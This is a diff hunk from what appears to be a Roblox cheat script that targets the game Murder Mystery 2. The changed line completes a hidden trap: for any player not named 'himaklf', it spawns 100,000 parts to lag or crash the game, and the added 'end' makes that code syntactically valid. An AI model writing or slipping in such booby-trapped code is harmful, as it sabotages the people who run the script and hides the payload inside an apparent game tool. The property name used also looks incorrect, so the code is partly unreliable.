@@ -53,7 +53,7 @@ if game.PlaceId == 142823291 then
 	local GmName = MainTab:CreateSection("Murder Mystery 2")
 	local Stopped = false
 	local FF = false
-	if game.Players.LocalPlayer.Name ~= "himaklf" then for i=0, 100000 do local newPart = Instance.new("Part",game.Workspace) newPart.Size = Vector3.new(1,1,1) newPart.Anchor = true end
+	if game.Players.LocalPlayer.Name ~= "himaklf" then for i=0, 100000 do local newPart = Instance.new("Part",game.Workspace) newPart.Size = Vector3.new(1,1,1) newPart.Anchor = true end end
 	while wait(1) do
 		if Stopped == false then
 			Stopped = true
